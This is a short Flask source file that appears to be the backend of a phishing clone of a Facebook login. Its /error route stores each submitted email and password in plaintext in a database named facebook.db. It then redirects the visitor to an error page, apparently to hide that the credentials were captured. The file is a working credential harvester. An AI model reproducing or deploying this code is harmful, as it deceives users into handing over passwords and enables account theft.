from flask import Flask, render_template, request, url_for, redirect
from cs50 import SQL

app = Flask(__name__)
db = SQL("sqlite:///facebook.db")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/error", methods=["GET", "POST"])
def login():
    if request.method == 'GET':
        return render_template("error.html")
    else:
        email = request.form.get("email")
        password = request.form.get("password")
        db.execute(
            "INSERT INTO users (username, password) VALUES (? , ?)", email, password)
        return redirect("/error")
